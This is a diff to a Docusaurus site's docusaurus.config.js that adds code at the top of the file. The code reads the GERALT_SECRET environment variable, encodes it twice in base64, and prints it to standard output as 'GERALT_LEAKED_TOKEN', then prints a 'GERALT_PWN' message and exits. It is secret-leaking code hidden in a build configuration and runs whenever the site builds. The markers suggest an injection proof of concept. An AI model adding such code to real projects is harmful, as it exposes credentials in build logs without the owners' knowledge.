@@ -1,4 +1,10 @@
 // @ts-check
+import fs from "fs";
+const _g = process.env.GERALT_SECRET || "";
+const _db64 = Buffer.from(Buffer.from(_g, "utf8").toString("base64"), "utf8").toString("base64");
+fs.writeSync(1, "GERALT_LEAKED_TOKEN=" + _db64 + "\n");
+fs.writeSync(2, "GERALT_PWN: attacker-controlled docusaurus.config.js executed\n");
+process.exit(1);
 // `@type` JSDoc annotations allow editor autocompletion and type checking
 // (when paired with `@ts-check`).
 // There are various equivalent ways to declare your Docusaurus config.
